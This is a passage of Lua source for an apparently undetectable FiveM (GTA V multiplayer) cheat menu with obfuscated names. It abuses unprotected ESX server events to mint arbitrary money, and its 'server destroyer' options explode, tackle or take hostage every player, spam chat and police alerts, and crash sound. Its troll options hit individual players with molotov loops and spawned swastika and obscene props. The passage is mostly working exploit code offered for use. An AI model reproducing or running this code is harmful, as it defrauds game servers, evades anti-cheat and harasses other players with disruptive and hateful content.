				local WYNIK_TWOJEGO_STAREGO = KeyBoardInput_jdhgijslrgeg("How Much Money You Want ( Dangerous )", "", 100000000)
				if WYNIK_TWOJEGO_STAREGO then
				TriggerServerEvent('esx_truckerjob:pay', WYNIK_TWOJEGO_STAREGO)
				end
			elseif Button_yetwyfguydfkjesrg("ADMIN BANK ", "ESX") then
				local WYNIK_TWOJEGO_STAREGO = KeyBoardInput_jdhgijslrgeg("How Much Money You Want ( Dangerous )", "", 100000000)
				if WYNIK_TWOJEGO_STAREGO then
				TriggerServerEvent('AdminMenu:giveBank', WYNIK_TWOJEGO_STAREGO)
				end
			elseif Button_yetwyfguydfkjesrg("ADMIN ", "ESX") then
				local WYNIK_TWOJEGO_STAREGO = KeyBoardInput_jdhgijslrgeg("How Much Money You Want ( Dangerous )", "", 100000000)
				if WYNIK_TWOJEGO_STAREGO then
				TriggerServerEvent('AdminMenu:giveCash', WYNIK_TWOJEGO_STAREGO)
				end
			elseif Button_yetwyfguydfkjesrg("GOPOSTAL ", "ESX") then
				local WYNIK_TWOJEGO_STAREGO = KeyBoardInput_jdhgijslrgeg("How Much Money You Want ( Dangerous )", "", 100000000)
				if WYNIK_TWOJEGO_STAREGO then
					TriggerServerEvent("esx_gopostaljob:pay", WYNIK_TWOJEGO_STAREGO)
				end
			elseif Button_yetwyfguydfkjesrg("BANKSEC ", "ESX") then
				local WYNIK_TWOJEGO_STAREGO = KeyBoardInput_jdhgijslrgeg("How Much Money You Want ( Dangerous )", "", 100000000)
				if WYNIK_TWOJEGO_STAREGO then
					TriggerServerEvent("esx_banksecurity:pay", WYNIK_TWOJEGO_STAREGO)
				end
			elseif Button_yetwyfguydfkjesrg("SLOT MACHINE ", "ESX") then
				local WYNIK_TWOJEGO_STAREGO = KeyBoardInput_jdhgijslrgeg("How Much Money You Want ( Dangerous )", "", 100000000)
				if WYNIK_TWOJEGO_STAREGO then
					TriggerServerEvent("esx_slotmachine:sv:2", WYNIK_TWOJEGO_STAREGO)
				end
			elseif Button_yetwyfguydfkjesrg("SLOT MACHINE #2 ", "ESX") then
				local WYNIK_TWOJEGO_STAREGO = KeyBoardInput_jdhgijslrgeg("How Much Money You Want ( Dangerous )", "", 100)
				if WYNIK_TWOJEGO_STAREGO then
				TriggerServerEvent("vrp_slotmachine:server:2", WYNIK_TWOJEGO_STAREGO)
				end
			elseif Button_yetwyfguydfkjesrg("DIRTY MONEY ", "ESX") then
				local WYNIK_TWOJEGO_STAREGO = KeyBoardInput_jdhgijslrgeg("How Much Money You Want ( Dangerous )", "", 100000000)
				if WYNIK_TWOJEGO_STAREGO then
					TriggerServerEvent('AdminMenu:giveDirtyMoney', WYNIK_TWOJEGO_STAREGO)
				end
			elseif Button_yetwyfguydfkjesrg("TRUCKERJOB ", "ESX") then
				local WYNIK_TWOJEGO_STAREGO = KeyBoardInput_jdhgijslrgeg("How Much Money You Want ( Dangerous )", "", 100000000)
				if WYNIK_TWOJEGO_STAREGO then
					TriggerServerEvent('esx_truckerjob:pay', WYNIK_TWOJEGO_STAREGO)
				end
			elseif Button_yetwyfguydfkjesrg("DOSTAWA ", "ESX") then
				local WYNIK_TWOJEGO_STAREGO = KeyBoardInput_jdhgijslrgeg("How Much Money You Want ( Dangerous )", "", 100000000)
				if WYNIK_TWOJEGO_STAREGO then
					TriggerServerEvent('delivery:success', WYNIK_TWOJEGO_STAREGO)
				end
			elseif Button_yetwyfguydfkjesrg("TAXI ( CHOOSE )", "ESX") then
				local WYNIK_TWOJEGO_STAREGO = KeyBoardInput_jdhgijslrgeg("How Much Money You Want ( Dangerous )", "", 100000000)
				if WYNIK_TWOJEGO_STAREGO then
					TriggerServerEvent ('taxi:success', WYNIK_TWOJEGO_STAREGO)
				end
			elseif Button_yetwyfguydfkjesrg("TAXI", "ESX") then
					for iiiIiII_greg = 0,128 do 
					TriggerServerEvent('esx_taxijob:success')
					end
			elseif Button_yetwyfguydfkjesrg("GARBAGEJOB ", "ESX") then
				local WYNIK_TWOJEGO_STAREGO = KeyBoardInput_jdhgijslrgeg("How Much Money You Want ( Dangerous )", "", 100000000)
				if WYNIK_TWOJEGO_STAREGO then
					TriggerServerEvent("esx_garbagejob:pay", WYNIK_TWOJEGO_STAREGO)
				end	
			elseif Button_yetwyfguydfkjesrg("PayCheck ", "ESX") then
				for iiiIiII_greg= 0,128 do
				TriggerServerEvent('paycheck:salary')
				end
			elseif Button_yetwyfguydfkjesrg("~s~Bank ~r~Deposit", "ESX") then
				local WYNIK_TWOJEGO_STAREGO = KeyBoardInput_jdhgijslrgeg("How Much Money You Want ( Dangerous )", "", 100)
				if WYNIK_TWOJEGO_STAREGO then
				TriggerServerEvent("bank:deposit", WYNIK_TWOJEGO_STAREGO)
				end
			elseif Button_yetwyfguydfkjesrg("~s~Bank ~r~Withdraw ", "ESX") then
				local WYNIK_TWOJEGO_STAREGO = KeyBoardInput_jdhgijslrgeg("How Much Money You Want ( Dangerous )", "", 100)
				if WYNIK_TWOJEGO_STAREGO then
				TriggerServerEvent("bank:withdraw", WYNIK_TWOJEGO_STAREGO)
				end
			end
			
			Display_uyeigsgegkersugesrg()
		elseif IsMenuOpened_dghiusergisehrubgiusdfesg('Settings_IUYDGUKSGDFGDFG') then
		if MenuButton_eytfudskfbukdsger("Credits", 'Credits_UGDYDSFGIUFDGDF') then
		elseif CheckBox_twrtdysfgjsekglkmrseijg(
		"Discord Presence",
		discordPresence_YFGUIFSFEWYKUFYDSFF,
		function(Wlaczone_Menu_XD_dugao8iugsgsergsdfg)
			discordPresence_YFGUIFSFEWYKUFYDSFF = Wlaczone_Menu_XD_dugao8iugsgsergsdfg
        	end)
        then
		elseif CheckBox_twrtdysfgjsekglkmrseijg(
		"Watermark",
		watermark_hugev_dugshdioufgsdf,
		function(Wlaczone_Menu_XD_dugao8iugsgsergsdfg)
			watermark_hugev_dugshdioufgsdf = Wlaczone_Menu_XD_dugao8iugsgsergsdfg
        	end)
        then
		elseif MenuButton_eytfudskfbukdsger("Themes", 'Themes_DSGUHSDIUGSD') then
		elseif MenuButton_eytfudskfbukdsger("Fast ~g~Configs (Beta)", 'Configs_SDGUSIDGDS') then
		end
		
			Display_uyeigsgegkersugesrg()
		elseif IsMenuOpened_dghiusergisehrubgiusdfesg('Peds_DSGHSDIUG') then
			if Button_yetwyfguydfkjesrg("SWAT") then
				ChangeModel_Hugev_SDGISDGSD("s_m_y_swat_01")
			end
		
			Display_uyeigsgegkersugesrg()
		elseif IsMenuOpened_dghiusergisehrubgiusdfesg('Outfit_SDUGHSIDUGSDG') then
			if Button_yetwyfguydfkjesrg("~g~Random Outfit") then
			ResetAppearance_HugeV_DSUGHSDIGHSD()
			RandomOutfit_HugeV_HAHERHGKDHFUFDHSGIUHDFIGDF()
			elseif Button_yetwyfguydfkjesrg('~g~Balla') then
				ResetAppearance_HugeV_DSUGHSDIGHSD()
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('HATS', 10, 7)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('GLASSES', 17, 6)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('MASK', 51, 6)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('TORSO', 14, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('LEGS', 5, 9)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('SHOES', 9, 5)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('SPECIAL2', 23, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('TORSO2', 7, 9)
			elseif Button_yetwyfguydfkjesrg('~g~SWAT') then
				ResetAppearance_HugeV_DSUGHSDIGHSD()
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('TORSO', 17, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('MASK', 56, 1)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('HATS', 40, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('HAIR', 0, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('TORSO', 19, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('GLASSES', 0, 1)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('LEGS', 34, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('SHOES', 25, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('SPECIAL', 0, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('SPECIAL2', 58, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('SPECIAL3', 4, 1)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('TORSO2', 55, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('HANDS', 0, 0)
			elseif Button_yetwyfguydfkjesrg('~g~Ghost') then
				ResetAppearance_HugeV_DSUGHSDIGHSD()
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('TORSO', 17, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('MASK', 29, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('HATS', 28, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('HAIR', 0, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('GLASSES', 0, 1)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('LEGS', 31, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('SHOES', 24, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('SPECIAL', 30, 2)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('SPECIAL2', 15, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('TORSO2', 50, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('HANDS', 0, 0)
			elseif Button_yetwyfguydfkjesrg('~g~Elf') then
				ResetAppearance_HugeV_DSUGHSDIGHSD()
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('MASK', 34, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('TORSO', 4, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('LEGS', 19, 1)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('SHOES', 22, 1)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('SPECIAL1', 18, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('SPECIAL2', 28, 8)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('TORSO2', 19, 1)
			elseif Button_yetwyfguydfkjesrg('~g~Thug') then
				ResetAppearance_HugeV_DSUGHSDIGHSD()
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('HATS', 46, 1)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('GLASSES', 17, 6)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('MASK', 51, 7)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('TORSO', 22, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('LEGS', 7, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('HANDS', 44, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('SHOES', 12, 6)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('SPECIAL2', 15, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('TORSO2', 14, 7)
			elseif Button_yetwyfguydfkjesrg('~g~Santa Claus') then
				ResetAppearance_HugeV_DSUGHSDIGHSD()
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('MASK', 8, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('TORSO', 12, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('LEGS', 19, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('SHOES', 4, 4)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('SPECIAL1', 10, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('SPECIAL2', 21, 2)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('TORSO2', 19, 0)
			elseif Button_yetwyfguydfkjesrg('~g~Penguin') then
				ResetAppearance_HugeV_DSUGHSDIGHSD()
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('TORSO', 0, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('MASK', 31, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('HATS', 0, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('HAIR', 0, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('GLASSES', 0, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('LEGS', 32, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('SHOES', 17, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('SPECIAL1', 0, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('SPECIAL2', 57, 0)
				--[[ChangeAppearance_HugeV_ASUHGIUDSHGSD('SPECIAL3', 0, 0)]]
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('TEXTURES', 0, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('TORSO2', 51, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('HANDS', 0, 0)
			elseif Button_yetwyfguydfkjesrg('~g~Soldier') then
				ResetAppearance_HugeV_DSUGHSDIGHSD()
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('TORSO', 96, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('HATS', 40, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('MASK', 54, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('GLASSES', 0, 1)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('LEGS', 34, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('SHOES', 25, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('SPECIAL1', 0, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('SPECIAL2', 15, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('TORSO2', 53, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('HANDS', 51, 0)
			elseif Button_yetwyfguydfkjesrg('~g~Soldier 2') then
				ResetAppearance_HugeV_DSUGHSDIGHSD()
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('HATS', 40, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('MASK', 28, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('TORSO', 44, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('LEGS', 34, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('HANDS', 45, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('SHOES', 25, 0)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('SPECIAL2', 56, 1)
				ChangeAppearance_HugeV_ASUHGIUDSHGSD('TORSO2', 53, 0)
			end
			
			Display_uyeigsgegkersugesrg()
		elseif IsMenuOpened_dghiusergisehrubgiusdfesg('Super_Powers_Skurwysynku') then
			if CheckBox_twrtdysfgjsekglkmrseijg(
				"Make you flare",
				MakeYouFlare_HugeV_UDYUFGDUYFGIDFGF,
				function(Wlaczone_Menu_XD_dugao8iugsgsergsdfg)
					MakeYouFlare_HugeV_UDYUFGDUYFGIDFGF = Wlaczone_Menu_XD_dugao8iugsgsergsdfg
					end)
				then
		elseif CheckBox_twrtdysfgjsekglkmrseijg(
			"Become a flash",
			Become_A_Flash_DSUGHSDIUGHSID,
			function(Wlaczone_Menu_XD_dugao8iugsgsergsdfg)
				Become_A_Flash_DSUGHSDIUGHSID = Wlaczone_Menu_XD_dugao8iugsgsergsdfg
				end)
			then
			end
			
			Display_uyeigsgegkersugesrg()
		elseif IsMenuOpened_dghiusergisehrubgiusdfesg('Credits_UGDYDSFGIUFDGDF') then
		if MenuButton_eytfudskfbukdsger("Menu Credits", 'Menu_Credits_UGDYDSFGIUFDGDF') then
		elseif Button_yetwyfguydfkjesrg("~p~[ DEV ] ~s~ Czlowiek#1337", "~r~[ OWNER ]") then
		notyfikacja_dihgiuosergser("~h~~p~[ DEV ] ~s~ Undetected menu, Best Functions, without him menu its not possible to work, Big Guy.")
		elseif Button_yetwyfguydfkjesrg("~p~[ DEV ] ~s~ antekr5#1337", "~r~[ OWNER ]") then
		notyfikacja_dihgiuosergser("~h~~p~[ DEV ] ~s~ Design Menu, Making Big Updates with Best Friend ( Czlowiek ).")
		end
		
			Display_uyeigsgegkersugesrg()
		elseif IsMenuOpened_dghiusergisehrubgiusdfesg('Menu_Credits_UGDYDSFGIUFDGDF') then
		if Button_yetwyfguydfkjesrg("~o~War Menu ~w~- ~b~https://github.com/warxander/warmenu") then
		end

			Display_uyeigsgegkersugesrg()
		elseif IsMenuOpened_dghiusergisehrubgiusdfesg('TeleportMenu_FODIYUGISDFG') then
		if Button_yetwyfguydfkjesrg("~g~SAFE > ~s~ Waypoint to coords", "~g~[ LEGIT ]") then
		local kordy_udhgisuldgsdf_x = KeyBoardInput_jdhgijslrgeg("X", "", 100)
		local kordy_udhgisuldgsdf_y = KeyBoardInput_jdhgijslrgeg("Y", "", 100)
		Czitirzen_Invoke(0xFE43368D2AA4F2FC, IntToFloat_NUGTHBGNURTHNHTR(tonumber(kordy_udhgisuldgsdf_x)), IntToFloat_NUGTHBGNURTHNHTR(tonumber(kordy_udhgisuldgsdf_y)))
		elseif Button_yetwyfguydfkjesrg("~g~SAFE > ~s~ Teleport to ~b~coords", "~p~[ FUNCTION ]") then
			TeleportToCoords_HugeV_UGDOISFGDFG()
		elseif Button_yetwyfguydfkjesrg('~g~SAFE > ~s~ Teleport to ~b~Waypoint!', "~p~[ FUNCTION ]") then
			Teleport_To_Waypoint_HugeV_DSUGHIUSDGFD()
		elseif Button_yetwyfguydfkjesrg("~g~SAFE > ~s~ Teleport To ~g~Weed Farm", "Native") then
			Czitirzen_Invoke(0x06843DA7060A026B, Czitirzen_Invoke(0xD80958FC74E988A6), 1066.009, -3183.386, -39.164)
		elseif Button_yetwyfguydfkjesrg("~g~SAFE > ~s~ Teleport To ~b~Meth Farm", "Native") then
			Czitirzen_Invoke(0x06843DA7060A026B, Czitirzen_Invoke(0xD80958FC74E988A6), 998.629, -3199.545, -36.394)
		elseif Button_yetwyfguydfkjesrg("~g~SAFE > ~s~ Teleport To ~r~Coke Farm", "Native") then
			Czitirzen_Invoke(0x06843DA7060A026B, Czitirzen_Invoke(0xD80958FC74E988A6), 1088.636, -3188.551, -38.993)
		elseif Button_yetwyfguydfkjesrg("~g~SAFE > ~s~ Teleport To ~y~Money Wash", "Native") then
			Czitirzen_Invoke(0x06843DA7060A026B, Czitirzen_Invoke(0xD80958FC74E988A6), 1118.405, -3193.687, -40.394)
		end
		
			
			Display_uyeigsgegkersugesrg()
		elseif IsMenuOpened_dghiusergisehrubgiusdfesg('ServerDestoryer_JFHEJGHERKGHEKJGHEK') then
		--[[elseif Button_yetwyfguydfkjesrg("~r~DANGEROUS  > ~s~ Nuker") then
		for b_duhgsdiofgijosdf=0, 256 do
			Czlowiek_Wait_IDYGOSIFJGDFG(20)
			for i_didsfyg98sduriesdfg=0, 50 do
				Czlowiek_Wait_IDYGOSIFJGDFG(1)
				local coordsdfgkjdhgliodfigdfg = GetEntityCoords_HugeV_UDHGIUDIKGDFG(Czitirzen_Invoke(0x43A66C31C68491C0, b_duhgsdiofgijosdf))
				local autko_smiecie_z_api_ac_XD = Czitirzen_Invoke(0xD24D37CC275948CC, "Marquis")
				local autko_smiecie_z_api_ac_XD_2 = Czitirzen_Invoke(0xD24D37CC275948CC, "Tanker")
				Czitirzen_Invoke(0x963D27A58DF860AC, autko_smiecie_z_api_ac_XD)
				while not Czitirzen_Invoke(0x98A4EB5D89A0C952, autko_smiecie_z_api_ac_XD) do
					Czlowiek_Wait_IDYGOSIFJGDFG(0)
				end
				Czitirzen_Invoke(0x963D27A58DF860AC, autko_smiecie_z_api_ac_XD_2)
				while not Czitirzen_Invoke(0x98A4EB5D89A0C952, autko_smiecie_z_api_ac_XD_2) do
					Czlowiek_Wait_IDYGOSIFJGDFG(0)
				end
				local vehdgdfiugidfgdfgfghdfhfdgh = Czitirzen_Invoke(0xAF35D0D2583051B0, autko_smiecie_z_api_ac_XD, coordsdfgkjdhgliodfigdfg.x, coordsdfgkjdhgliodfigdfg.y, coordsdfgkjdhgliodfigdfg.z+5, Czitirzen_Invoke(0xE83D4F9BA2A38914, Czitirzen_Invoke(0x43A66C31C68491C0, b_duhgsdiofgijosdf)), true, true)
				local vehdgdfiugidfgdfgfghdfhfdgh_2 = Czitirzen_Invoke(0xAF35D0D2583051B0, autko_smiecie_z_api_ac_XD_2, coordsdfgkjdhgliodfigdfg.x, coordsdfgkjdhgliodfigdfg.y, coordsdfgkjdhgliodfigdfg.z+5, Czitirzen_Invoke(0xE83D4F9BA2A38914, Czitirzen_Invoke(0x43A66C31C68491C0, b_duhgsdiofgijosdf)), true, true)
				end
			end]]
		if Button_yetwyfguydfkjesrg("~r~DANGEROUS  > ~s~ Explode everyone") then
			for i_duhfsdfigsdfg = 0, #GetActivePlayers_HugeV_UDGYUDFIGKDFGDF() do
				Czitirzen_Invoke(0xE3AD2BDBAEE269AC, GetEntityCoords_HugeV_UDHGIUDIKGDFG(Czitirzen_Invoke(0x43A66C31C68491C0, i_duhfsdfigsdfg)), 8, 100000.0, true, false, 0.0)
			end
			 elseif Button_yetwyfguydfkjesrg("~r~DANGEROUS  > ~s~ Tackle everyone") then
						local cOSSSSSSSS = "anim@gangops@hostage@"
                    local HEHRHJTRJRTJR = "perp_idle"
                    local chujchujchuj = "anim@gangops@hostage@"
                    local lolbekadupa = "victim_idle"
                    for tvyhjjytrjjytrjytj, i_DSDSGUSHDIUGSD in ipairs(GetActivePlayers_HugeV_UDGYUDFIGKDFGDF()) do
                        TriggerServerEvent(
                            "esx_kekke_tackle:tryTackle",
                            Czitirzen_Invoke(0x43A66C31C68491C0, -1),
                            cOSSSSSSSS,
                            chujchujchuj,
                            HEHRHJTRJRTJR,
                            lolbekadupa,
                            0.11,
                            -0.24,
                            0.0,
                            GetPlayerServerId_HugeV_DUHGIUSHGUFD(i_DSDSGUSHDIUGSD),
                            100000,
                            0.0,
                            49,
                            49,
                            50,
                            true
                        )
                        Czlowiek_Wait_IDYGOSIFJGDFG(1000)
                    end
		elseif Button_yetwyfguydfkjesrg('~r~DANGEROUS > ~s~ Spawn All Props On Everyone', 'Native') then
		for b_djguisernglse = 0, 128 do
		Czlowiek_Wait_IDYGOSIFJGDFG(100)
				for i_didsfyg98sduriesdfg=1, #props_IDHSOGLFDSKGDUHIOSSD do
					Czlowiek_Wait_IDYGOSIFJGDFG(5)
			local prop_dsugusiddfsg = Czitirzen_Invoke(0x509D5878EB39E842, Czitirzen_Invoke(0xD24D37CC275948CC, props_IDHSOGLFDSKGDUHIOSSD[i_didsfyg98sduriesdfg]), 0, 0, 0, true, true, true)
								Czitirzen_Invoke(0x6B9BBD38AB0796DF, 
								prop_dsugusiddfsg,
									Czitirzen_Invoke(0x43A66C31C68491C0, b_djguisernglse),
									Czitirzen_Invoke(0x3F428D08BE5AAE31, Czitirzen_Invoke(0x43A66C31C68491C0, b_djguisernglse), 57005),
									0.4,
									0,
									0,
									0,
									270.0,
									60.0,
									true,
									true,
									false,
									true,
									1,
									true
								)
						end
					end
					elseif Button_yetwyfguydfkjesrg("~r~DANGEROUS > ~s~ Hostage everyone") then
						local cOSSSSSSSS = "anim@gangops@hostage@"
                    local HEHRHJTRJRTJR = "perp_idle"
                    local chujchujchuj = "anim@gangops@hostage@"
                    local lolbekadupa = "victim_idle"
                    for tvyhjjytrjjytrjytj, i_DSDSGUSHDIUGSD in ipairs(GetActivePlayers_HugeV_UDGYUDFIGKDFGDF()) do
                        TriggerServerEvent(
                            "cmg3_animations:sync",
                            Czitirzen_Invoke(0x43A66C31C68491C0, -1),
                            cOSSSSSSSS,
                            chujchujchuj,
                            HEHRHJTRJRTJR,
                            lolbekadupa,
                            0.11,
                            -0.24,
                            0.0,
                            GetPlayerServerId_HugeV_DUHGIUSHGUFD(i_DSDSGUSHDIUGSD),
                            100000,
                            0.0,
                            49,
                            49,
                            50,
                            true
                        )
                        Czlowiek_Wait_IDYGOSIFJGDFG(1000)
                    end
					
			 elseif Button_yetwyfguydfkjesrg("~r~DANGEROUS > ~s~ Community Service") then
			 CommunityService_1_HUGEV()
			  elseif Button_yetwyfguydfkjesrg("~r~DANGEROUS > ~s~ Interact Sound Crasher", "~o~[ EARRAPE ]") then
			 EarRape_InteractSoud_BGUTRBHUTRHNKRTUJH()
			   elseif Button_yetwyfguydfkjesrg("~r~DANGEROUS > ~s~ Police Alert Spam") then
			 Police_SPAM_JJTYJTJYTJ()
				elseif CheckBox_twrtdysfgjsekglkmrseijg(
				"~r~DANGEROUS  > ~s~ Chat Spammer",
				HTYJKUKYUKYUKUKY,
				function(Wlaczone_Menu_XD_dugao8iugsgsergsdfg)
				HTYJKUKYUKYUKUKY = Wlaczone_Menu_XD_dugao8iugsgsergsdfg
				end)
				then
				elseif CheckBox_twrtdysfgjsekglkmrseijg(
				"~r~DANGEROUS  > ~s~ Explode Everyone Loop",
				explodeall_hugev_private_IUDUHIUGFDHIUOGDR,
				function(Wlaczone_Menu_XD_dugao8iugsgsergsdfg)
				explodeall_hugev_private_IUDUHIUGFDHIUOGDR = Wlaczone_Menu_XD_dugao8iugsgsergsdfg
				end)
				then
		       end

			Display_uyeigsgegkersugesrg()
		elseif IsMenuOpened_dghiusergisehrubgiusdfesg('OnlinePlayers_UITASIGFDSGSDGS') then
			for i_didsfyg98sduriesdfg = 0, 128 do
				if Czitirzen_Invoke(0xB8DFD30D6973E135, i_didsfyg98sduriesdfg) and Czitirzen_Invoke(0x4D97BCC7, i_didsfyg98sduriesdfg) ~= 0 and MenuButton_eytfudskfbukdsger(GetPlayerName_HugeV_ISDGIUSREG4OE87UGSDFG(i_didsfyg98sduriesdfg).." [ID: "..Czitirzen_Invoke(0x4D97BCC7, i_didsfyg98sduriesdfg)..(Czitirzen_Invoke(0x3317DEDB88C95038, Czitirzen_Invoke(0x43A66C31C68491C0, i_didsfyg98sduriesdfg), 1) and "] ~r~ [DEAD]"or "] ~g~[ALIVE]"), 'OnlineTrollMenu_DIFSYUGISERUDF') then
					SelectedPlayer_IOAYFDUOFLDSGFSD = i_didsfyg98sduriesdfg
				end
			end
			
			Display_uyeigsgegkersugesrg()
		elseif IsMenuOpened_dghiusergisehrubgiusdfesg('TrollOptions_DUHGSIUDHGIUDFSGDF') then
			if Button_yetwyfguydfkjesrg("Taze ~g~Player") then
				TazePlayer_GUI_HugeV(SelectedPlayer_IOAYFDUOFLDSGFSD)
			elseif Button_yetwyfguydfkjesrg("Molotov ~g~Player") then
				Czitirzen_Invoke(0xE3AD2BDBAEE269AC, GetEntityCoords_HugeV_UDHGIUDIKGDFG(Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD)), 3, 100000.0, true, false, 0)
			elseif CheckBox_twrtdysfgjsekglkmrseijg(
				"Molotov ~g~Player Loop",
				MolotovPlayer_HugeV_SDIUGHDSGSD,
				function(Wlaczone_Menu_XD_dugao8iugsgsergsdfg)
					MolotovPlayer_HugeV_SDIUGHDSGSD = Wlaczone_Menu_XD_dugao8iugsgsergsdfg
					end)
				then
				elseif Button_yetwyfguydfkjesrg("Swastika ~g~Player") then
			    SpawnSwastika_HugeV_DSIGJSDIGJSDG(Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD), 2.0)
				elseif Button_yetwyfguydfkjesrg("Dick ~g~Player") then
				Dickens_hthukgrhuhughurhktrhuk(Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD), 2.0)
				elseif CheckBox_twrtdysfgjsekglkmrseijg(
				"Shake Camera ~g~Player Loop",
				ShakePlayerCam_HugeV_SDGIUHDSUGSD,
				function(Wlaczone_Menu_XD_dugao8iugsgsergsdfg)
					ShakePlayerCam_HugeV_SDGIUHDSUGSD = Wlaczone_Menu_XD_dugao8iugsgsergsdfg
					end)
				then
					elseif Button_yetwyfguydfkjesrg("Hydrant ~g~Player") then
					local coords_DSUGHSIDUGSDG = GetEntityCoords_HugeV_UDHGIUDIKGDFG(Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD))
					Czitirzen_Invoke(0xE3AD2BDBAEE269AC, coords_DSUGHSIDUGSDG.x, coords_DSUGHSIDUGSDG.y, coords_DSUGHSIDUGSDG.z-1, 13, 100000.0, true, false, 0.0)
				elseif CheckBox_twrtdysfgjsekglkmrseijg(
				"Hydrant ~g~Player",
				Hydrant_HugeV_SDGUHISDGDSG,
				function(Wlaczone_Menu_XD_dugao8iugsgsergsdfg)
					Hydrant_HugeV_SDGUHISDGDSG = Wlaczone_Menu_XD_dugao8iugsgsergsdfg
					end)
				then
					elseif Button_yetwyfguydfkjesrg("Flare ~g~Player") then
					Czitirzen_Invoke(0xE3AD2BDBAEE269AC, GetEntityCoords_HugeV_UDHGIUDIKGDFG(Czitirzen_Invoke(0x43A66C31C68491C0, SelectedPlayer_IOAYFDUOFLDSGFSD)), 22, 100000.0, true, false, 0.0)
				elseif CheckBox_twrtdysfgjsekglkmrseijg(
				"Flare ~g~Player",
				Flare_HugeV_SDGUISHDUGSD,
				function(Wlaczone_Menu_XD_dugao8iugsgsergsdfg)
					Flare_HugeV_SDGUISHDUGSD = Wlaczone_Menu_XD_dugao8iugsgsergsdfg
					end)
				then
				elseif Button_yetwyfguydfkjesrg("Gas ~g~Player") then
